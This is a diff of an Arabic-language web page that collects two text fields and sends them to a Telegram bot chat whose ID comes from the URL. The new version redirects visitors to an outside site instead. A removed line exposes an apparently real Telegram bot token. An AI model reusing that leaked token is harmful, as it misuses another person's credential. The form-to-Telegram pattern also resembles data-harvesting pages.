@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>🔗 إدخال بيانات</title>
+  <title>📩 إرسال بيانات</title>
   <style>
     body { font-family: Arial; text-align: center; padding-top: 50px; background: #f9f9f9; }
     input { padding: 10px; margin: 10px; width: 200px; }
@@ -13,25 +13,26 @@
   <h2 id="status">⏳ جاري تجهيز الصفحة ...</h2>
 
   <div id="form" style="display: none;">
-    <input type="text" id="input1" placeholder="النص الأول">
+    <input type="text" id="input1" placeholder="اكتب النص الأول">
     <br>
-    <input type="text" id="input2" placeholder="النص الثاني">
+    <input type="text" id="input2" placeholder="اكتب النص الثاني">
     <br>
     <button onclick="sendToBot()">✅ إرسال للبوت</button>
   </div>
 
   <script>
     let chatId;
-
+    
     window.onload = function() {
       const params = new URLSearchParams(window.location.search);
-      chatId = params.get('chatId');
+      const chatId = params.get('chatId');
 
       if (chatId) {
-        document.getElementById('status').innerText = "✅ أدخل بياناتك:";
-        document.getElementById('form').style.display = 'block';
+        // 🟢 هنا رابط موقعك انت اللي هتوديه ليه
+        const targetURL = `https://Medo.Broblems.com/mysite/index.html?id=${chatId}`;
+        window.location.href = targetURL;
       } else {
-        document.getElementById('status').innerText = "❌ مفيش chatId في الرابط";
+        document.body.innerHTML = "<h2>❌ مفيش chatId في الرابط</h2>";
       }
     };
 
@@ -39,16 +40,16 @@
       const val1 = document.getElementById('input1').value;
       const val2 = document.getElementById('input2').value;
 
-      const text = `✅ بيانات جديدة:
+      const text = `📥 بيانات جديدة من الموقع:
 🔹 النص الأول: ${val1}
 🔹 النص الثاني: ${val2}`;
 
-      const botToken = '7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA'; // ✏️ حط توكن البوت بتاعك هنا
+      const botToken = 'YOUR_BOT_TOKEN'; // ✏️ حط توكن البوت بتاعك هنا
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       const data = {
-        chat_id: chatId,  // ⬅️ هنا بناخد ال ID من الرابط
+        chat_id: chatId, // 🟢 هي دي الفكرة: البوت يبعت لنفس الـ ID اللي جاي من الرابط
         text: text
       };
 
@@ -61,7 +62,7 @@
       })
       .then(response => response.json())
       .then(data => {
-        alert("✅ تم إرسال البيانات للبوت!");
+        alert("✅ تم إرسال البيانات بنجاح!");
       })
       .catch(error => {
         console.error('Error:', error);
